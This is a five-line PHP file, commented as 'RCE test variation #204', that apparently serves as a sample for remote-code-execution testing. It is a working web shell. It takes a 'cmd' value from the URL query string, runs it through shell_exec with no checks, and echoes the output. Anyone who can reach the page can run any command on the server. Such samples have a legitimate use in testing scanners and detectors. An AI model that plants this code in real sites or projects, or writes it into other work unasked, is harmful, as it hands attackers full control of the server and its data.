<?php
// RCE test variation #204
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>